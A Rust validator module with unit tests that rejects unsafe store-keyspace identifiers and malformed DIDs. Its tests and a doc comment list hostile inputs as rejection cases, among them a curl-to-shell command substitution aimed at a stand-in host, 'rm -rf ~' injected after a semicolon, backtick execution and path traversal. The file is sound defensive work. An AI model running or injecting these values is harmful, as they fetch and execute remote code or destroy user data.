//! Pure validators for caller-supplied identifiers that compose into
//! store-keyspace keys.
//!
//! Several VTA route handlers build keys by formatting caller-supplied
//! strings directly into templates like `tpl:ctx:{context_id}:{name}`
//! or `ctx:{id}`. A caller that supplies a string containing the
//! separator character `:` could collide with or inject into adjacent
//! namespaces. This module enforces the invariant at the boundary.
//!
//! The accepted character class is deliberately narrow:
//! `[A-Za-z0-9._-]` with a length cap of 64 bytes. If you think you
//! need `:` or `/` in an identifier, you probably want the identifier
//! split into two fields instead — collisions are not worth the
//! convenience.
//!
//! ## Why this lives in the SDK
//! These rules are the canonical, security-relevant gate for what a
//! context segment may contain. A **client** that constructs context
//! paths must apply the *same* rules so it only ever sends paths the
//! VTA will accept. Keeping the validator here (rather than in the
//! server-only `vti-common`) lets clients share the one source of
//! truth instead of mirroring it and risking drift. The server
//! re-exports these through `vti_common::identifier`, mapping the
//! [`ValidationError`] to its own `AppError` for ergonomics.

/// Maximum length of a validated identifier in bytes. 64 is generous
/// for slugs, context IDs, template names; anything longer is almost
/// certainly a mistake or an injection attempt.
pub const MAX_IDENTIFIER_LEN: usize = 64;

/// A pure validation failure, dependency-light so clients can consume
/// it without pulling in any server infrastructure.
///
/// The server wraps this into its own `AppError::Validation` (the
/// `Display` string is preserved verbatim), so error messages are
/// identical regardless of which side ran the validator.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[error("{0}")]
pub struct ValidationError(pub String);

/// Validate a caller-supplied identifier (context ID, template name,
/// slug). Accepts ASCII alphanumerics plus `.`, `_`, `-`. Rejects
/// empty strings, anything over [`MAX_IDENTIFIER_LEN`] bytes, and any
/// character outside the allowed class — including the separator
/// characters (`:`, `/`, whitespace) that would let a caller collide
/// with or traverse into adjacent store-keyspace prefixes.
///
/// `label` names the field being validated so the resulting
/// [`ValidationError`] message is self-describing.
pub fn validate_identifier(label: &str, value: &str) -> Result<(), ValidationError> {
    if value.is_empty() {
        return Err(ValidationError(format!("{label} must not be empty")));
    }
    if value.len() > MAX_IDENTIFIER_LEN {
        return Err(ValidationError(format!(
            "{label} is {} bytes; maximum is {MAX_IDENTIFIER_LEN}",
            value.len()
        )));
    }
    for (i, ch) in value.chars().enumerate() {
        let ok = ch.is_ascii_alphanumeric() || ch == '.' || ch == '_' || ch == '-';
        if !ok {
            return Err(ValidationError(format!(
                "{label} contains an invalid character {ch:?} at position {i}; \
                 allowed: A-Z, a-z, 0-9, '.', '_', '-'"
            )));
        }
    }
    Ok(())
}

/// The longest DID [`validate_did_core`] accepts.
pub const MAX_DID_CORE_LEN: usize = 1024;

/// A DID as DID-core's ABNF has it, and nothing else:
///
/// ```text
/// did                = "did:" method-name ":" method-specific-id
/// method-name        = 1*method-char          ; method-char = %x61-7A / DIGIT
/// method-specific-id = *( *idchar ":" ) 1*idchar
/// idchar             = ALPHA / DIGIT / "." / "-" / "_" / pct-encoded
/// ```
///
/// No path, query or fragment, no whitespace, nothing else — so a value that
/// passes can be shown to an operator, and pasted into a shell, without
/// carrying anything but a DID. A looser pattern (`^did:[a-z0-9]+:\S+$`, the
/// `git-ns/_shared` schema's) admits `did:web:x.example$(curl${IFS}…|sh)`.
pub fn validate_did_core(label: &str, value: &str) -> Result<(), ValidationError> {
    let bad = |why: &str| Err(ValidationError(format!("{label} is not a DID: {why}")));
    if value.len() > MAX_DID_CORE_LEN {
        return bad("too long");
    }
    let Some(rest) = value.strip_prefix("did:") else {
        return bad("it must start with `did:`");
    };
    let Some((method, msid)) = rest.split_once(':') else {
        return bad("it has no method-specific identifier");
    };
    if method.is_empty()
        || !method
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
    {
        return bad("the method name must be lowercase letters and digits");
    }
    let b = msid.as_bytes();
    if b.is_empty() || b[b.len() - 1] == b':' {
        return bad("the method-specific identifier must end in an identifier character");
    }
    let mut i = 0;
    while i < b.len() {
        match b[i] {
            c if c.is_ascii_alphanumeric() || matches!(c, b'.' | b'-' | b'_' | b':') => i += 1,
            b'%' if i + 2 < b.len()
                && b[i + 1].is_ascii_hexdigit()
                && b[i + 2].is_ascii_hexdigit() =>
            {
                i += 3
            }
            b'%' => return bad("a `%` must begin a percent-encoded octet"),
            _ => {
                return bad(
                    "only letters, digits, `.`, `-`, `_`, `:` and percent-encoded octets may \
                     appear after the method",
                );
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_common_identifier_shapes() {
        for ok in [
            "myapp",
            "My-App_1",
            "context.v2",
            "a",
            "0",
            "didcomm-mediator",
            "_private",
            "CamelCase",
        ] {
            validate_identifier("id", ok).unwrap_or_else(|e| panic!("{ok:?} rejected: {e:?}"));
        }
    }

    #[test]
    fn rejects_empty() {
        let err = validate_identifier("id", "").expect_err("empty must be rejected");
        assert_eq!(err.0, "id must not be empty");
    }

    #[test]
    fn rejects_separator_injection() {
        // These are the concrete attack shapes: a caller who can inject
        // `:` can collide with or escape adjacent store namespaces.
        for bad in [
            "global:evil",     // collides with tpl:global: prefix
            "../../etc",       // path traversal shape
            "a:b:c",           // keyspace separator
            "my/ctx",          // path separator
            "with space",      // whitespace
            "tab\there",       // control chars
            "with\nnewline",   // newline injection
            "null\0byte",      // null byte
            "unicode:§§",      // non-ASCII
            "quote\"injected", // quote shape
        ] {
            validate_identifier("id", bad).expect_err(&format!("{bad:?} must be rejected"));
        }
    }

    #[test]
    fn rejects_too_long() {
        let long = "a".repeat(MAX_IDENTIFIER_LEN + 1);
        validate_identifier("id", &long).expect_err("overlong must be rejected");
    }

    #[test]
    fn accepts_exactly_at_limit() {
        let edge = "a".repeat(MAX_IDENTIFIER_LEN);
        validate_identifier("id", &edge).expect("exactly-at-limit must pass");
    }

    #[test]
    fn error_message_names_the_field() {
        let err = validate_identifier("context_id", "bad:id").expect_err("rejected");
        assert!(
            err.0.contains("context_id"),
            "error must name the field it is validating — got {}",
            err.0
        );
    }

    #[test]
    fn validate_did_core_accepts_did_core_dids() {
        for ok in [
            "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK",
            "did:webvh:QmSCID:example.com",
            "did:web:example.com:user:alice",
            "did:web:example.com%3A8443",
            "did:peer:2.Ez6LS_x-y",
            "did:example::a",
        ] {
            validate_did_core("did", ok).unwrap_or_else(|e| panic!("{ok:?} rejected: {e:?}"));
        }
    }

    #[test]
    fn validate_did_core_rejects_everything_else() {
        for bad in [
            "",
            "did:",
            "did:web",
            "did:web:",
            "did::x",
            "did:Web:x",
            "did:we-b:x",
            "did:web:x:",
            "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
            "did:web:x;rm -rf ~",
            "did:web:x`id`",
            "did:web:x|sh",
            "did:web:x&y",
            "did:web:x'y",
            "did:web:x\"y",
            "did:web:x y",
            "did:web:x\ty",
            "did:web:x\ny",
            "did:web:x/path",
            "did:web:x?query",
            "did:web:x#frag",
            "did:web:x%",
            "did:web:x%4",
            "did:web:x%zz",
            "did:web:§",
            "not-a-did",
        ] {
            validate_did_core("did", bad).expect_err(&format!("{bad:?} must be rejected"));
        }
        let long = format!("did:key:{}", "a".repeat(MAX_DID_CORE_LEN));
        validate_did_core("did", &long).expect_err("overlong must be rejected");
    }
}
